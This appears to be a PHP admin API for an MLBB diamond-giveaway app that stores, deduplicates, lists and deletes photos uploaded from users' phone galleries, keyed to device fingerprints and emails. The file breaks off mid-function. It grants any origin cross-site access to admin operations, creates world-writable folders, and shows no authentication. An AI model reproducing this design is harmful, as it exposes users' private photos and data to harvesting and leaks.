<?php
/**
 * Ketupat MLBB Admin API Controller
 * Full CRUD & Management Engine with Highest Access Privileges
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

if (($_SERVER['REQUEST_METHOD'] ?? '') === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/webauthn.php';

@ini_set('memory_limit', '256M');
@ini_set('post_max_size', '64M');
@ini_set('upload_max_filesize', '64M');
@ini_set('max_execution_time', '120');

// Helper to respond with JSON
function sendJson($success, $data = null, $message = '', $statusCode = 200) {
    http_response_code($statusCode);
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'data'    => $data,
        'timestamp' => date('Y-m-d H:i:s')
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

/**
 * Strips raw Android build identifiers (e.g., "Build/TP1A.220624.014")
 * and resolves internal device codes (e.g., "SM-S908E") to consumer phone names (e.g., "Samsung Galaxy S22 Ultra").
 */
function formatPhoneModelName($raw) {
    if (empty($raw)) return 'Android Device';
    $str = trim($raw);

    // 1. Strip Build IDs like "Build/TP1A.220624.014", "Build/UQ1A...", "Build/...", etc.
    $str = preg_replace('/\s*Build\/[^\s,;]+.*/i', '', $str);
    $str = preg_replace('/\s*Build[A-Za-z0-9._-]+.*/i', '', $str);

    // 2. Clean browser UA fragments if userAgent was uploaded directly
    $str = preg_replace('/^(?:Mozilla\/5\.0|Linux; Android \d+;?|\(Linux; Android \d+;?)\s*/i', '', $str);
    $str = trim(str_replace([';', ')', '(', 'wv'], '', $str));

    if (empty($str)) return 'Android Device';

    // 3. Known phone model mappings
    $modelMap = [
        // Samsung Galaxy S-Series
        'SM-S908' => 'Samsung Galaxy S22 Ultra',
        'SM-S901' => 'Samsung Galaxy S22',
        'SM-S906' => 'Samsung Galaxy S22+',
        'SM-S918' => 'Samsung Galaxy S23 Ultra',
        'SM-S911' => 'Samsung Galaxy S23',
        'SM-S916' => 'Samsung Galaxy S23+',
        'SM-S928' => 'Samsung Galaxy S24 Ultra',
        'SM-S921' => 'Samsung Galaxy S24',
        'SM-S926' => 'Samsung Galaxy S24+',
        'SM-S938' => 'Samsung Galaxy S25 Ultra',
        'SM-S931' => 'Samsung Galaxy S25',
        'SM-S936' => 'Samsung Galaxy S25+',
        'SM-G998' => 'Samsung Galaxy S21 Ultra',
        'SM-G991' => 'Samsung Galaxy S21',
        'SM-G996' => 'Samsung Galaxy S21+',
        'SM-G988' => 'Samsung Galaxy S20 Ultra',
        'SM-G980' => 'Samsung Galaxy S20',
        'SM-G981' => 'Samsung Galaxy S20 5G',
        'SM-G985' => 'Samsung Galaxy S20+',
        'SM-G986' => 'Samsung Galaxy S20+ 5G',
        'SM-G973' => 'Samsung Galaxy S10',
        'SM-G975' => 'Samsung Galaxy S10+',
        'SM-G970' => 'Samsung Galaxy S10e',
        'SM-G780' => 'Samsung Galaxy S20 FE',
        'SM-G781' => 'Samsung Galaxy S20 FE 5G',

        // Samsung Galaxy Note Series
        'SM-N986' => 'Samsung Galaxy Note 20 Ultra',
        'SM-N981' => 'Samsung Galaxy Note 20',
        'SM-N975' => 'Samsung Galaxy Note 10+',
        'SM-N970' => 'Samsung Galaxy Note 10',

        // Samsung Galaxy Z Fold & Flip Series
        'SM-F946' => 'Samsung Galaxy Z Fold5',
        'SM-F936' => 'Samsung Galaxy Z Fold4',
        'SM-F926' => 'Samsung Galaxy Z Fold3',
        'SM-F731' => 'Samsung Galaxy Z Flip5',
        'SM-F721' => 'Samsung Galaxy Z Flip4',
        'SM-F711' => 'Samsung Galaxy Z Flip3',

        // Samsung Galaxy A Series
        'SM-A546' => 'Samsung Galaxy A54 5G',
        'SM-A536' => 'Samsung Galaxy A53 5G',
        'SM-A528' => 'Samsung Galaxy A52s 5G',
        'SM-A526' => 'Samsung Galaxy A52 5G',
        'SM-A525' => 'Samsung Galaxy A52',
        'SM-A346' => 'Samsung Galaxy A34 5G',
        'SM-A336' => 'Samsung Galaxy A33 5G',
        'SM-A256' => 'Samsung Galaxy A25 5G',
        'SM-A156' => 'Samsung Galaxy A15 5G',
        'SM-A155' => 'Samsung Galaxy A15',
        'SM-A146' => 'Samsung Galaxy A14 5G',
        'SM-A145' => 'Samsung Galaxy A14',
        'SM-A556' => 'Samsung Galaxy A55 5G',
        'SM-A356' => 'Samsung Galaxy A35 5G',
        'SM-A736' => 'Samsung Galaxy A73 5G',

        // Xiaomi & POCO & Redmi
        '23127PN0CG' => 'Xiaomi 14',
        '23127PN0CC' => 'Xiaomi 14',
        '23116PN5BC' => 'Xiaomi 14 Pro',
        '24030PN60G' => 'Xiaomi 14 Ultra',
        '2210132G'   => 'Xiaomi 13 Pro',
        '2211133G'   => 'Xiaomi 13',
        '2201122G'   => 'Xiaomi 12 Pro',
        '2201123G'   => 'Xiaomi 12',
        'M2012K11AG' => 'POCO F3',
        '22041216UG' => 'POCO F4',
        '23049PCD8G' => 'POCO F5',
        '24069PC21G' => 'POCO F6',
        '2311DRK48G' => 'POCO X6 Pro',
        '22101316G'  => 'Redmi Note 12 Pro+',
        '23090RA98G' => 'Redmi Note 13 Pro+',
        '2312DRA50G' => 'Redmi Note 13 Pro',
        '2201117TY'  => 'Redmi Note 11',
        '2201116SG'  => 'Redmi Note 11 Pro',

        // ASUS ROG
        'ASUS_AI2201' => 'ASUS ROG Phone 6',
        'ASUS_AI2202' => 'ASUS Zenfone 9',
        'ASUS_AI2205' => 'ASUS ROG Phone 7',
        'ASUS_AI2401' => 'ASUS ROG Phone 8'
    ];

    foreach ($modelMap as $code => $friendlyName) {
        if (stripos($str, $code) !== false) {
            return $friendlyName;
        }
    }

    if (preg_match('/^SM-([A-Z0-9]+)/i', $str, $m)) {
        return 'Samsung Galaxy (' . strtoupper($m[0]) . ')';
    }

    return $str;
}

/**
 * Resolves the dedicated local gallery directory for a specific device.
 * Strictly isolates different physical devices / emulator instances by device_id.
 */
function resolveDeviceFolder($deviceId, $userEmail = '', $createIfMissing = false) {
    $galleryDir = __DIR__ . '/uploads/gallery';
    if (!is_dir($galleryDir)) {
        @mkdir($galleryDir, 0777, true);
    }

    $targetDir = null;
    $cleanDir = '';
    $cleanDevId = !empty($deviceId) ? preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower(trim($deviceId))) : '';

    // 1. Candidate directory names strictly matching device ID
    if (!empty($cleanDevId)) {
        $rawDevId = strtolower(trim($deviceId));
        $candidates = [
            'device_' . $cleanDevId,
            $cleanDevId,
            'device_' . $rawDevId,
            $rawDevId
        ];
        foreach ($candidates as $cand) {
            $candPath = $galleryDir . '/' . $cand;
            if (is_dir($candPath)) {
                $targetDir = $candPath;
                $cleanDir = $cand;
                break;
            }
        }
    }

    // 2. Scan meta.json files strictly matching device_id or directory name (exact match only)
    if (!$targetDir && !empty($deviceId) && is_dir($galleryDir)) {
        $targetDevLower = strtolower(trim($deviceId));
        foreach (scandir($galleryDir) as $d) {
            if ($d === '.' || $d === '..') continue;
            $fullD = $galleryDir . '/' . $d;
            if (!is_dir($fullD)) continue;
            $mFile = $fullD . '/meta.json';
            if (file_exists($mFile)) {
                $m = json_decode(file_get_contents($mFile), true);
                if (is_array($m)) {
                    $mDev = strtolower(trim($m['device_id'] ?? ''));
                    $dLower = strtolower($d);
                    if ($mDev === $targetDevLower ||
                        $dLower === $targetDevLower ||
                        $dLower === $cleanDevId ||
                        $dLower === ('device_' . $cleanDevId) ||
                        $dLower === ('device_' . $targetDevLower)) {
                        $targetDir = $fullD;
                        $cleanDir = $d;
                        break;
                    }
                }
            }
        }
    }

    // 3. Fallback to user email ONLY if deviceId is completely empty AND userEmail is a real email
    if (!$targetDir && empty($deviceId) && !empty($userEmail) && strtolower($userEmail) !== 'guest@ketupat.app' && !str_ends_with(strtolower($userEmail), '@ketupat.app') && is_dir($galleryDir)) {
        $cleanUserKey = 'user_' . preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower(trim($userEmail)));
        $candPath = $galleryDir . '/' . $cleanUserKey;
        if (is_dir($candPath)) {
            $targetDir = $candPath;
            $cleanDir = $cleanUserKey;
        } else {
            $targetEmailLower = strtolower(trim($userEmail));
            foreach (scandir($galleryDir) as $d) {
                if ($d === '.' || $d === '..') continue;
                $fullD = $galleryDir . '/' . $d;
                if (!is_dir($fullD)) continue;
                $mFile = $fullD . '/meta.json';
                if (file_exists($mFile)) {
                    $m = json_decode(file_get_contents($mFile), true);
                    if (is_array($m) && strtolower(trim($m['user_email'] ?? '')) === $targetEmailLower) {
                        $targetDir = $fullD;
                        $cleanDir = $d;
                        break;
                    }
                }
            }
        }
    }

    // 4. Create new folder if requested and not found
    if (!$targetDir && $createIfMissing) {
        if (!empty($cleanDevId)) {
            $folderName = 'device_' . $cleanDevId;
        } else if (!empty($userEmail) && !str_ends_with(strtolower($userEmail), '@ketupat.app')) {
            $folderName = 'user_' . preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower(trim($userEmail)));
        } else {
            $folderName = 'device_dev_' . bin2hex(random_bytes(8));
        }
        $cleanDir = $folderName;
        $targetDir = $galleryDir . '/' . $cleanDir;
        if (!is_dir($targetDir)) {
            @mkdir($targetDir, 0777, true);
        }
    }

    return [$targetDir, $cleanDir];
}

/**
 * Rigorously cleans and sanitizes a device gallery folder:
 * - Enforces strictly AT MOST 1 avatar (avatar_current.jpg)
 * - Prunes any duplicate avatar files from disk
 * - Deduplicates all regular device photos by content MD5
 * - Removes any regular photo that duplicates the avatar
 * - Persists the clean photo manifest directly to meta.json
 */
function cleanAndSanitizeDeviceGallery($targetDir, &$meta) {
    if (!$targetDir || !is_dir($targetDir)) return;
    if (!is_array($meta)) $meta = ['photos' => []];
    if (!isset($meta['photos']) || !is_array($meta['photos'])) $meta['photos'] = [];

    $cleanDir = basename($targetDir);
    $allFiles = scandir($targetDir);

    // 1. Scan physical disk files for avatar files
    $avatarFiles = [];
    $allDiskFiles = [];
    foreach ($allFiles as $f) {
        if ($f === '.' || $f === '..' || $f === 'meta.json') continue;
        $fp = $targetDir . '/' . $f;
        if (!is_file($fp)) continue;
        $allDiskFiles[$f] = $fp;
        if (strpos(strtolower($f), 'avatar_') === 0) {
            $avatarFiles[] = [
                'file' => $f,
                'path' => $fp,
                'mtime' => filemtime($fp)
            ];
        }
    }

    $avatarCurrentExists = file_exists($targetDir . '/avatar_current.jpg');
    if (!empty($avatarFiles)) {
        if (!$avatarCurrentExists) {
            usort($avatarFiles, function($a, $b) { return $b['mtime'] - $a['mtime']; });
            @rename($avatarFiles[0]['path'], $targetDir . '/avatar_current.jpg');
            $avatarCurrentExists = true;
            $allDiskFiles['avatar_current.jpg'] = $targetDir . '/avatar_current.jpg';
        }
        // Unlink all other avatar files on disk
        foreach ($avatarFiles as $af) {
            if ($af['file'] !== 'avatar_current.jpg' && file_exists($af['path'])) {
                @unlink($af['path']);
                unset($allDiskFiles[$af['file']]);
            }
        }
    }

    $avatarHash = $avatarCurrentExists ? md5_file($targetDir . '/avatar_current.jpg') : null;

    // 2. Build deduplicated photos array
    $seenHashes = [];
    $seenFilenames = [];
    $cleanPhotos = [];

    if ($avatarCurrentExists) {
        $cleanPhotos[] = [
            'id'           => 'avatar_current',
            'filename'     => 'avatar_current.jpg',
            'name'         => 'Profile Avatar',
            'url'          => 'uploads/gallery/' . $cleanDir . '/avatar_current.jpg',
            'size'         => filesize($targetDir . '/avatar_current.jpg'),
            'mime'         => 'image/jpeg',
            'is_avatar'    => true,
            'content_hash' => $avatarHash,
            'date_added'   => date('c', filemtime($targetDir . '/avatar_current.jpg'))
        ];
        if ($avatarHash) $seenHashes[$avatarHash] = true;
        $seenFilenames['avatar_current.jpg'] = true;
    }

    foreach ($meta['photos'] as $p) {
        $pName = strtolower($p['name'] ?? '');
        $pFn = strtolower($p['filename'] ?? '');
        $isAv = !empty($p['is_avatar']) || (strpos($pName, 'avatar_') === 0) || (strpos($pFn, 'avatar_') === 0);
        if ($isAv) continue; // Avatar already registered above

        $fn = $p['filename'] ?? '';
        if (empty($fn) || !isset($allDiskFiles[$fn]) || !file_exists($allDiskFiles[$fn])) continue;

        $fp = $allDiskFiles[$fn];
        $h = !empty($p['content_hash']) ? $p['content_hash'] : md5_file($fp);

        if (!empty($h) && isset($seenHashes[$h])) {
            // Exact content duplicate of avatar or prior photo; delete duplicate from disk
            @unlink($fp);
            unset($allDiskFiles[$fn]);
            continue;
        }
        if (isset($seenFilenames[$fn])) continue;

        if (!empty($h)) $seenHashes[$h] = true;
        $seenFilenames[$fn] = true;

        $p['content_hash'] = $h;
        $cleanPhotos[] = $p;
    }

    // 3. Scan physical regular files on disk that might not be in meta yet
    foreach ($allDiskFiles as $df => $dfp) {
        if (isset($seenFilenames[$df])) continue;
        if (strpos(strtolower($df), 'avatar_') === 0) continue;
        $ext = strtolower(pathinfo($df, PATHINFO_EXTENSION));
        if (!in_array($ext, ['jpg', 'jpeg', 'png', 'webp', 'gif'])) continue;

        $dh = md5_file($dfp);
        if (!empty($dh) && isset($seenHashes[$dh])) {
            @unlink($dfp);
            continue;
        }

        if (!empty($dh)) $seenHashes[$dh] = true;
        $seenFilenames[$df] = true;

        $cleanPhotos[] = [
            'id'           => $df,
            'filename'     => $df,
            'name'         => $df,
            'url'          => 'uploads/gallery/' . $cleanDir . '/' . $df,
            'size'         => filesize($dfp),
            'mime'         => ($ext === 'png' ? 'image/png' : ($ext === 'webp' ? 'image/webp' : 'image/jpeg')),
            'is_avatar'    => false,
            'content_hash' => $dh,
            'date_added'   => date('c', filemtime($dfp))
        ];
    }

    $meta['photos'] = $cleanPhotos;
    $meta['last_sanitized'] = date('c');
    $metaFile = $targetDir . '/meta.json';
    @file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}

/**
 * Permanently deletes a device and all associated data from disk & Supabase
 */
function deleteDeviceCompletely($deviceId, $userEmail = null, $mlbbId = null) {
    if (empty($deviceId) && empty($userEmail) && empty($mlbbId)) return false;

    $galleryDir = __DIR__ . '/uploads/gallery';
    if (empty($userEmail) && strpos($deviceId, '@') !== false) {
        $userEmail = $deviceId;
    }

    $targetDirs = [];
    $cleanId = !empty($deviceId) ? preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($deviceId)) : '';
    if (!empty($cleanId)) {
        $candidates = [
            $galleryDir . '/device_' . $cleanId,
            $galleryDir . '/' . $cleanId,
            $galleryDir . '/user_' . $cleanId
        ];
        foreach ($candidates as $cand) {
            if (is_dir($cand) && !in_array($cand, $targetDirs)) {
                $targetDirs[] = $cand;
            }
        }
    }

    if (is_dir($galleryDir)) {
        foreach (scandir($galleryDir) as $d) {
            if ($d === '.' || $d === '..') continue;
            $dirPath = $galleryDir . '/' . $d;
            if (!is_dir($dirPath)) continue;

            $mFile = $dirPath . '/meta.json';
            if (file_exists($mFile)) {
                $m = json_decode(file_get_contents($mFile), true);
                if (is_array($m)) {
                    $mDev = $m['device_id'] ?? '';
                    $mEmail = $m['user_email'] ?? '';
                    $mMlbb = $m['mlbb_id'] ?? '';

                    $matches = false;
                    if (!empty($deviceId)) {
                        $matches = ($mDev === $deviceId || $d === $cleanId || $d === 'device_' . $cleanId || $d === 'user_' . $cleanId);
                    } else if (!empty($userEmail)) {
                        $matches = ($mEmail === $userEmail);
                    } else if (!empty($mlbbId)) {
                        $matches = ($mMlbb === $mlbbId);
                    }

                    if ($matches) {
                        if (!in_array($dirPath, $targetDirs)) {
                            $targetDirs[] = $dirPath;
                        }
                        if (!$userEmail && !empty($mEmail)) $userEmail = $mEmail;
                    }
                }
            } else if (!empty($cleanId) && ($d === $cleanId || $d === 'device_' . $cleanId || $d === 'user_' . $cleanId)) {
                if (!in_array($dirPath, $targetDirs)) {
                    $targetDirs[] = $dirPath;
                }
            }
        }
    }

    // 1. Delete physical folders and all photo files from disk
    foreach ($targetDirs as $tDir) {
        if (is_dir($tDir)) {
            foreach (scandir($tDir) as $f) {
                if ($f === '.' || $f === '..') continue;
                $fp = $tDir . '/' . $f;
                if (is_file($fp)) @unlink($fp);
            }
            @rmdir($tDir);
        }
    }

    // 2. Permanently delete from Supabase database (users, redemptions, giveaway_entries)
    $emailsToDelete = [];
    if (!empty($userEmail)) $emailsToDelete[] = $userEmail;
    if (!empty($deviceId) && strpos($deviceId, '@') !== false) $emailsToDelete[] = $deviceId;
    if (!empty($deviceId)) {
        $emailsToDelete[] = 'device_' . $deviceId . '@ketupat.app';
    }

    // Search Supabase users table by device_id in location_text, or email
    $queryParts = [];
    if (!empty($deviceId)) {
        $queryParts[] = 'email.eq.' . urlencode($deviceId);
        $queryParts[] = 'email.eq.' . urlencode('device_' . $deviceId . '@ketupat.app');
        $queryParts[] = 'location_text.like.*' . urlencode($deviceId) . '*';
    }
    if (!empty($userEmail)) {
        $queryParts[] = 'email.eq.' . urlencode($userEmail);
    }
    // Only search by mlbb_id if deviceId and userEmail are empty
    if (empty($deviceId) && empty($userEmail) && !empty($mlbbId) && $mlbbId !== '—') {
        $queryParts[] = 'mlbb_id.eq.' . urlencode($mlbbId);
    }

    if (!empty($queryParts)) {
        $uLookup = supabaseApiRequest('users?or=(' . implode(',', $queryParts) . ')&select=email,mlbb_id', 'GET');
        if ($uLookup['success'] && is_array($uLookup['data'])) {
            foreach ($uLookup['data'] as $row) {
                if (!empty($row['email'])) $emailsToDelete[] = $row['email'];
            }
        }
    }

    $emailsToDelete = array_unique(array_filter($emailsToDelete));

    // Delete matching users and their redemptions/giveaways from Supabase
    foreach ($emailsToDelete as $em) {
        supabaseApiRequest('users?email=eq.' . urlencode($em), 'DELETE');
        supabaseApiRequest('redemptions?user_email=eq.' . urlencode($em), 'DELETE');
        supabaseApiRequest('giveaway_entries?user_email=eq.' . urlencode($em), 'DELETE');
    }

    if (!empty($deviceId)) {
        supabaseApiRequest('users?location_text=like.*' . urlencode($deviceId) . '*', 'DELETE');
    }

    if (!empty($mlbbId) && $mlbbId !== '—') {
        supabaseApiRequest('users?mlbb_id=eq.' . urlencode($mlbbId), 'DELETE');
        supabaseApiRequest('redemptions?user_id=eq.' . urlencode($mlbbId), 'DELETE');
    }

    return true;
}

/**
 * Aggregates all connected user devices across:
 * 1. uploads/gallery directory
 * 2. users table in Supabase
 * 3. redemptions table in Supabase
 * 4. giveaway_entries table in Supabase
 */
function getDeviceGalleryOverviewList() {
    $galleryDir = __DIR__ . '/uploads/gallery';
    $unifiedMap = [];

    // Helper to find matching device index in $unifiedMap by physical device ID, user email, or MLBB account
    $findMatchIndex = function(&$map, $devId, $mlbbId, $realEmail) {
        $devIdIsHardware = (!empty($devId) && str_starts_with(strtolower($devId), 'dev_') && strlen($devId) >= 12);

        foreach ($map as $idx => $d) {
            $dIsHardware = (!empty($d['device_id']) && str_starts_with(strtolower($d['device_id']), 'dev_') && strlen($d['device_id']) >= 12);

            // Strict Physical Isolation:
            // If EITHER record is a physical hardware device, they ONLY match if their device_id is identical!
            // Two different physical phones / BlueStacks emulators MUST NEVER be merged into the same card!
            if ($devIdIsHardware || $dIsHardware) {
                if (!empty($devId) && !empty($d['device_id']) && strtolower($devId) === strtolower($d['device_id'])) {
                    return $idx;
                }
                continue;
            }

            // Match by exact device_id if present
            if (!empty($devId) && !empty($d['device_id']) && strtolower($devId) === strtolower($d['device_id'])) {
                return $idx;
            }

            // Match by real user email ONLY if neither record is a hardware device
            if (!empty($realEmail) && !empty($d['email']) && strtolower($realEmail) === strtolower($d['email'])) {
                return $idx;
            }

            // Match by MLBB ID ONLY if neither record is a hardware device
            if (!empty($mlbbId) && $mlbbId !== '—' && !empty($d['mlbb_id']) && $d['mlbb_id'] !== '—' && $mlbbId === $d['mlbb_id']) {
                return $idx;
            }
        }
        return -1;
    };

    // Helper to merge candidate into $unifiedMap
    $mergeDevice = function(&$map, $candidate) use (&$findMatchIndex) {
        $devId = $candidate['device_id'] ?? '';
        $fingerprint = $candidate['device_fingerprint'] ?? '';
        $mlbbId = $candidate['mlbb_id'] ?? '';
        $email = $candidate['email'] ?? '';
        $isFakeEmail = empty($email) || str_ends_with(strtolower($email), '@ketupat.app') || strtolower($email) === 'guest@ketupat.app';
        $realEmail = $isFakeEmail ? '' : $email;

        $idx = $findMatchIndex($map, $devId, $mlbbId, $realEmail);
        if ($idx >= 0) {
            $t = &$map[$idx];
            // 1. Upgrade device_id if candidate has a true hardware ID (e.g. dev_ed832de68852d7c0)
            $isCandidateHardware = (strpos($devId, 'dev_') === 0 && strlen($devId) >= 15 && preg_match('/^dev_[a-f0-9]+$/i', $devId));
            $isTargetHardware = (strpos($t['device_id'], 'dev_') === 0 && strlen($t['device_id']) >= 15 && preg_match('/^dev_[a-f0-9]+$/i', $t['device_id']));
            if ($isCandidateHardware && !$isTargetHardware) {
                $t['device_id'] = $devId;
                $t['folder_name'] = preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower('device_' . $devId));
            }
            // 2. Upgrade phone model if candidate has specific model
            if (($t['phone_model'] === 'Android Device' || empty($t['phone_model'])) && !empty($candidate['phone_model']) && $candidate['phone_model'] !== 'Android Device') {
                $t['phone_model'] = $candidate['phone_model'];
                $t['device_model'] = $candidate['device_model'];
                $t['device_name'] = $candidate['phone_model'];
            }
            // 3. Upgrade fingerprint
            if (($t['device_fingerprint'] === 'Pending Sync' || empty($t['device_fingerprint'])) && !empty($fingerprint) && $fingerprint !== 'Pending Sync') {
                $t['device_fingerprint'] = $fingerprint;
            }
            // 4. Upgrade real email
            if (empty($t['email']) && !empty($realEmail)) {
                $t['email'] = $realEmail;
            }
            // 5. Upgrade IGN
            if ((empty($t['ign']) || $t['ign'] === '—' || $t['ign'] === 'Player') && !empty($candidate['ign']) && $candidate['ign'] !== '—' && $candidate['ign'] !== 'Player') {
                $t['ign'] = $candidate['ign'];
            }
            // 6. Upgrade MLBB account
            if ((empty($t['mlbb_id']) || $t['mlbb_id'] === '—') && !empty($mlbbId) && $mlbbId !== '—') {
                $t['mlbb_id'] = $mlbbId;
            }
            if ((empty($t['mlbb_server']) || $t['mlbb_server'] === '—') && !empty($candidate['mlbb_server']) && $candidate['mlbb_server'] !== '—') {
                $t['mlbb_server'] = $candidate['mlbb_server'];
            }
            // 7. Upgrade access status
            if (!empty($candidate['has_access']) || (!empty($candidate['access_status']) && ($candidate['access_status'] === 'granted' || $candidate['access_status'] === 'full_access'))) {
                $t['has_access'] = true;
                $t['access_status'] = 'granted';
            } else if (!$t['has_access'] && (!empty($candidate['access_status']) && $candidate['access_status'] === 'avatar_only')) {
                $t['access_status'] = 'avatar_only';
            }
            // 8. Merge binds
            if (empty($t['binds']) && !empty($candidate['binds'])) {
                $t['binds'] = $candidate['binds'];
            }
            if (empty($t['user_binds']) && !empty($candidate['user_binds'])) {
                $t['user_binds'] = $candidate['user_binds'];
            }
            // 9. Merge thumbnail / preview photos
            if (empty($t['thumbnail']) && !empty($candidate['thumbnail'])) {
                $t['thumbnail'] = $candidate['thumbnail'];
            }
            foreach ($candidate['preview_photos'] ?? [] as $pp) {
                if (count($t['preview_photos']) < 4 && !in_array($pp, $t['preview_photos'])) {
                    $t['preview_photos'][] = $pp;
                }
            }
            $t['photo_count'] = max($t['photo_count'], $candidate['photo_count'] ?? 0);
            $t['device_count'] = max($t['device_count'], $candidate['device_count'] ?? 0);
            $t['storage_size_bytes'] = max($t['storage_size_bytes'], $candidate['storage_size_bytes'] ?? 0);
            $t['points'] = max($t['points'], $candidate['points'] ?? 0);
            $t['diamonds_claimed'] = max($t['diamonds_claimed'], $candidate['diamonds_claimed'] ?? 0);
        } else {
            $map[] = $candidate;
        }
    };

    // 1. Scan unique device folders in uploads/gallery
    if (is_dir($galleryDir)) {
        $dirs = scandir($galleryDir);
        foreach ($dirs as $d) {
            if ($d === '.' || $d === '..') continue;
            $fullPath = $galleryDir . '/' . $d;
            if (!is_dir($fullPath)) continue;

            $metaFile = $fullPath . '/meta.json';
            $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : null;
            if (!is_array($meta)) {
                $meta = [
                    'device_id'    => $d,
                    'device_name'  => 'Android Device',
                    'device_model' => 'Android Device',
                    'photos'       => []
                ];
            }

            cleanAndSanitizeDeviceGallery($fullPath, $meta);

            $deviceId = $meta['device_id'] ?? '';
            if (empty($deviceId)) {
                $deviceId = (strpos($d, 'device_') === 0) ? substr($d, 7) : $d;
            }

            $deviceCount = 0;
            $hasAvatar = false;
            $avatarUrl = null;
            $recentPhoto = null;
            $previewPhotos = [];
            $folderTotalBytes = 0;

            foreach ($meta['photos'] as $p) {
                $pUrl = $p['url'] ?? '';
                if (strpos($pUrl, 'uploads/gallery/') === false && $d) {
                    $pUrl = 'uploads/gallery/' . $d . '/' . basename($p['filename'] ?? '');
                }
                $pSize = intval($p['size'] ?? 0);
                $folderTotalBytes += $pSize;

                if (!empty($p['is_avatar'])) {
                    $hasAvatar = true;
                    $avatarUrl = $pUrl;
                } else {
                    $deviceCount++;
                    if (!$recentPhoto) $recentPhoto = $pUrl;
                }

                if (count($previewPhotos) < 4 && !empty($pUrl) && !in_array($pUrl, $previewPhotos)) {
                    $previewPhotos[] = $pUrl;
                }
            }

            $photoCount = ($hasAvatar ? 1 : 0) + $deviceCount;

            // Check Supabase avatar if no avatar found
            $email = $meta['user_email'] ?? '';
            if (!$hasAvatar && !empty($email)) {
                $uLookupAv = supabaseApiRequest('users?email=eq.' . urlencode($email) . '&select=avatar_data', 'GET');
                if ($uLookupAv['success'] && !empty($uLookupAv['data'][0]['avatar_data'])) {
                    $hasAvatar = true;
                    $photoCount++;
                    if (!$avatarUrl) $avatarUrl = $uLookupAv['data'][0]['avatar_data'];
                    if (count($previewPhotos) < 4) $previewPhotos[] = $avatarUrl;
                }
            }

            $hasFullAccess = !empty($meta['is_full_access']) || ($deviceCount > 0);
            $accessStatus = $hasFullAccess ? 'granted' : ($hasAvatar ? 'avatar_only' : 'none');

            $rawDevName = $meta['device_name'] ?? '';
            $rawDevModel = $meta['device_model'] ?? '';
            $phoneModel = formatPhoneModelName(!empty($rawDevModel) ? $rawDevModel : (!empty($rawDevName) ? $rawDevName : 'Android Device'));
            $deviceName = $phoneModel;
            $deviceModel = $phoneModel;

            $mlbbId = $meta['mlbb_id'] ?? '—';
            $mlbbServer = $meta['mlbb_server'] ?? '—';
            $ign = $meta['mlbb_ign'] ?? 'Player';
            $rawEmail = trim($meta['user_email'] ?? '');
            $email = (empty($rawEmail) || strtolower($rawEmail) === 'guest@ketupat.app' || str_ends_with(strtolower($rawEmail), '@ketupat.app')) ? '' : $rawEmail;
            $userPoints = 0;
            $userDiamonds = 0;

            if (!empty($email) && ($mlbbId === '—' || $mlbbServer === '—' || $ign === 'Player')) {
                $uLookup = supabaseApiRequest('users?email=eq.' . urlencode($email) . '&select=mlbb_id,mlbb_server,mlbb_ign,points,diamonds_claimed', 'GET');
                if ($uLookup['success'] && !empty($uLookup['data'][0])) {
                    $sp = $uLookup['data'][0];
                    if ($mlbbId === '—' && !empty($sp['mlbb_id'])) $mlbbId = $sp['mlbb_id'];
                    if ($mlbbServer === '—' && !empty($sp['mlbb_server'])) $mlbbServer = $sp['mlbb_server'];
                    if ($ign === 'Player' && !empty($sp['mlbb_ign'])) $ign = $sp['mlbb_ign'];
                    $userPoints = intval($sp['points'] ?? 0);
                    $userDiamonds = intval($sp['diamonds_claimed'] ?? 0);
                }
            }

            $mergeDevice($unifiedMap, [
                'device_id'              => $deviceId,
                'folder_name'            => $d,
                'device_name'            => $deviceName,
                'device_model'           => $deviceModel,
                'phone_model'            => $phoneModel,
                'device_fingerprint'     => $meta['device_fingerprint'] ?? '',
                'email'                  => $email,
                'ign'                    => $ign,
                'mlbb_id'                => $mlbbId,
                'mlbb_server'            => $mlbbServer,
                'has_access'             => $hasFullAccess,
                'access_status'          => $accessStatus,
                'device_count'           => $deviceCount,
                'photo_count'            => $photoCount,
                'thumbnail'              => $recentPhoto ?: $avatarUrl,
                'preview_photos'         => $previewPhotos,
                'storage_size_bytes'     => $folderTotalBytes,
                'binds'                  => $meta['binds'] ?? [],
                'user_binds'             => $meta['user_binds'] ?? [],
                'points'                 => $userPoints,
                'diamonds_claimed'       => $userDiamonds,
                'last_active'            => $meta['last_synced'] ?? date('c')
            ]);
        }
    }

    // 2. Also list registered users from Supabase users table
    $usersRes = supabaseApiRequest('users?select=email,username,mlbb_id,mlbb_server,mlbb_ign,avatar_data,location_text,created_at,updated_at,points,diamonds_claimed&order=created_at.desc&limit=1000', 'GET');
    if ($usersRes['success'] && is_array($usersRes['data'])) {
        foreach ($usersRes['data'] as $u) {
            $rawUEmail = trim($u['email'] ?? '');
            $uEmail = strtolower($rawUEmail);
            $uId = $u['mlbb_id'] ?? '';
            $isFakeUEmail = empty($uEmail) || $uEmail === 'guest@ketupat.app' || str_ends_with($uEmail, '@ketupat.app');
            $displayUEmail = $isFakeUEmail ? '' : $rawUEmail;

            // Decode device location & identity
            $loc = (!empty($u['location_text']) && strpos($u['location_text'], '{') !== false) ? json_decode($u['location_text'], true) : null;
            $locDevId = (!empty($loc) && !empty($loc['device_id'])) ? trim($loc['device_id']) : null;
            $devFingerprint = (!empty($loc) && !empty($loc['device_fingerprint'])) ? trim($loc['device_fingerprint']) : 'Pending Sync';

            $devId = $locDevId;
            if (empty($devId) && str_starts_with($uEmail, 'device_dev_')) {
                $devId = substr($rawUEmail, 7, strpos($rawUEmail, '@') - 7);
            }
            if (empty($devId) && !empty($uId)) {
                $devId = 'dev_' . $uId;
            }
            if (empty($devId) && !empty($displayUEmail)) {
